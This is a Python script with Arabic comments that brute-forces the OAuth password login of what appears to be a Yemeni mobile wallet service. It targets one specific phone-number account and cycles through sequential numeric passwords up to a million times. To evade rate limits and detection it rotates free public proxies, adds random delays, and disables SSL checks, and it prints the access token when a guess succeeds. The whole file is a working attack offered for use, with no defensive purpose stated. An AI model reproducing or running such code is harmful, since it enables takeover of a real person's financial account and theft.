import requests
import time
import os
import random
from requests.exceptions import RequestException, ProxyError, ConnectionError

# إلغاء تحذيرات SSL
requests.packages.urllib3.disable_warnings()

# --- الإعدادات الأساسية ---
BASE_URL = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/"
ENDPOINT = "oauth/token"
FULL_URL = BASE_URL + ENDPOINT

BASE_DATA = {
    "grant_type": "password",
    "client_id": "restapp",
    "client_secret": "restapp",
    "username": "772490746",
    "scope": "openid"
}

initial_password = 142800232
MAX_ATTEMPTS = 1_000_000
PROGRESS_FILE = "sh.txt"

# --- إعدادات البروكسي ---
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
]
PROXY_CHANGE_INTERVAL = 50  # تغيير البروكسي كل 50 محاولة
REQUEST_TIMEOUT = 15
DELAY_BETWEEN_REQUESTS = (0.5, 1.5)  # تأخير عشوائي بين 0.5 و 1.5 ثانية

# --- متغيرات البروكسي ---
proxy_list = []
current_proxy_index = 0

def fetch_proxies():
    """جلب قائمة بروكسيات من المصادر المتاحة."""
    global proxy_list
    proxies = set()
    for source in PROXY_SOURCES:
        try:
            response = requests.get(source, timeout=10)
            if response.status_code == 200:
                lines = response.text.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # تنسيق البروكسي: ip:port
                        if ':' in line:
                            proxies.add(line)
        except Exception as e:
            print(f"⚠️ خطأ في جلب البروكسي من {source}: {e}")
    proxy_list = list(proxies)
    print(f"✅ تم جلب {len(proxy_list)} بروكسي.")
    return proxy_list

def get_proxy():
    """إرجاع بروكسي عشوائي من القائمة، أو None إذا لم يوجد."""
    global current_proxy_index
    if not proxy_list:
        return None
    # تدوير البروكسيات
    proxy = proxy_list[current_proxy_index % len(proxy_list)]
    current_proxy_index += 1
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def load_progress():
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, "r") as f:
                return int(f.read().strip())
        except:
            return None
    return None

def save_progress(value):
    with open(PROGRESS_FILE, "w") as f:
        f.write(str(value))
        f.flush()

def get_access_token():
    global current_proxy_index

    # تحميل التقدم
    saved = load_progress()
    if saved is not None:
        current_password = saved + 1
        print(f"🔄 استئناف من {current_password} (آخر محفوظ: {saved})")
    else:
        current_password = initial_password
        print(f"🔄 بدء من {current_password}")

    # جلب البروكسيات
    fetch_proxies()
    if not proxy_list:
        print("⚠️ لا توجد بروكسيات متاحة، سيتم العمل بدون بروكسي.")

    attempt = 0
    proxy_attempt_counter = 0

    while attempt < MAX_ATTEMPTS:
        attempt += 1
        proxy_attempt_counter += 1

        # تغيير البروكسي كل N محاولات
        if proxy_attempt_counter >= PROXY_CHANGE_INTERVAL:
            proxy_attempt_counter = 0
            current_proxy_index += 1  # تدوير البروكسي

        data = BASE_DATA.copy()
        data["password"] = str(current_password)

        proxies = get_proxy() if proxy_list else None

        try:
            response = requests.post(
                FULL_URL,
                data=data,
                verify=False,
                timeout=REQUEST_TIMEOUT,
                proxies=proxies
            )

            # طباعة حالة بسيطة كل 100 محاولة
            if attempt % 100 == 0:
                proxy_display = proxies.get("http") if proxies else "بدون بروكسي"
                print(f"🔄 محاولة {attempt} - كلمة المرور: {current_password} - بروكسي: {proxy_display}")

            if response.status_code == 200:
                json_response = response.json()
                save_progress(current_password)
                print(f"\n✅ نجاح! كلمة المرور: {current_password}")
                print(f"🔑 التوكن: {json_response.get('access_token')}")
                return json_response
            else:
                # فشل – لا نطبع تفاصيل كثيرة
                pass

        except (ProxyError, ConnectionError) as e:
            print(f"⚠️ بروكسي غير صالح، ننتقل إلى التالي... ({e})")
            current_proxy_index += 1  # تغيير البروكسي فوراً
        except RequestException as e:
            # خطأ عام في الطلب
            pass

        # حفظ التقدم كل 10 محاولات (لتقليل الكتابة)
        if attempt % 10 == 0:
            save_progress(current_password)

        # تأخير عشوائي
        time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))

        current_password += 1

    print("❌ انتهت المحاولات دون نجاح.")
    return None

if __name__ == "__main__":
    token_data = get_access_token()
    if token_data:
        print("✅ البوت يعمل بنجاح.")
    else:
        print("❌ تعذر الحصول على التوكن.")
